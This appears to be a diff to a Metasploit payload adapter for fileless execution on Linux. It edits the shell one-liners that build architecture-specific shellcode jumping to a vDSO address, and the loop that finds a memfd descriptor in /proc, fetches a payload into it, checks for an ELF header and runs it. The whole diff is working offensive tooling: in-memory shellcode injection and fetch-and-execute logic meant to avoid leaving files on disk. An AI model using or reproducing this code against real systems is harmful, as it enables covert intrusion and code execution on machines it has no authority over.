@@ -196,25 +196,25 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # mov rax, [target address]
     # jmp rax
     when 'x64'
-      %^"48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
+      %^"48b8"$(v=$(printf %016x $vdso_addr); o=; while [ -n "$v" ]; do o=$o${v#"${v%??}"}; v=${v%??}; done; echo "$o")"ffe0"^
     
     # x86 shellcode
     # mov eax, [target address]
     # jmp eax
     when 'x86'
-      %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
+      %^"b8"$(v=$(printf %08x $vdso_addr); o=; while [ -n "$v" ]; do o=$o${v#"${v%??}"}; v=${v%??}; done; echo "$o")"ffe0"^
     
     # ARM64 shellcode
     # ldr x0, #8
     # br x0
     when 'aarch64'
-      %^"4000005800001fd6"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"4000005800001fd6"$(v=$(printf %016x $vdso_addr); o=; while [ -n "$v" ]; do o=$o${v#"${v%??}"}; v=${v%??}; done; echo "$o")^
     
     # ARMle shelcode
     # ldr.w r2, [pc, #4]
     # bx    r2 
     when 'armle'
-      %^"dff804201047"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"dff804201047"$(v=$(printf %04x $vdso_addr); o=; while [ -n "$v" ]; do o=$o${v#"${v%??}"}; v=${v%??}; done; echo "$o")^
     
     # ARMbe shelcode
     # ldr.w r2, [pc, #4]
@@ -228,7 +228,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # lw	$t2, 16($ra)
     # jr $t2
     when 'mipsle'
-      %^"000011040000000026504a011000ea8f0800400100000000"$(echo $(printf %04x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"000011040000000026504a011000ea8f0800400100000000"$(v=$(printf %04x $vdso_addr); o=; while [ -n "$v" ]; do o=$o${v#"${v%??}"}; v=${v%??}; done; echo "$o")^
     
     # MIPSBE shellcode
     # bgezal $zero, 4
@@ -252,7 +252,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # jr    t0
     # .dword [target address]
     when 'riscv64le'
-      %^"9702000083b2c20067800200"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"9702000083b2c20067800200"$(v=$(printf %016x $vdso_addr); o=; while [ -n "$v" ]; do o=$o${v#"${v%??}"}; v=${v%??}; done; echo "$o")^
 
     # RISC-V 32-bit LE shellcode
     # auipc t0, 0
@@ -260,7 +260,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # jr    t0
     # .word [target address]
     when 'riscv32le'
-      %^"9702000083a2c20067800200"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"9702000083a2c20067800200"$(v=$(printf %08x $vdso_addr); o=; while [ -n "$v" ]; do o=$o${v#"${v%??}"}; v=${v%??}; done; echo "$o")^
 
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
@@ -292,7 +292,7 @@ def _generate_fileless_shell(get_file_cmd, arch)
 
   cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
   cmd << 'do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];'
-  cmd << "then if $(#{get_file_cmd} >/dev/null);"
+  cmd << "then if #{get_file_cmd} >/dev/null && [ \"$(dd if=$f bs=1 count=4 2>/dev/null)\" = \"$(printf '\\177ELF')\" ];"
   cmd << 'then $f & FOUND=1;break;'
   cmd << 'fi;'
   cmd << 'fi;'
@@ -325,15 +325,16 @@ end
     # and execute it
     cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
     cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
-    cmd << "; then if $(#{get_file_cmd} >/dev/null)"
+    cmd << "; then if #{get_file_cmd} >/dev/null && [ \"$(dd if=$f bs=1 count=4 2>/dev/null)\" = \"$(printf '\\177ELF')\" ]"
     cmd << '; then $f'
     cmd << '; FOUND=1'
-    cmd << '; break'
+    cmd << '; exit 0'
     cmd << '; fi'
     cmd << '; fi'
     cmd << '; done'
     cmd << '; fi'
     cmd << '; done'
+    cmd << ';'
 
     cmd
   end
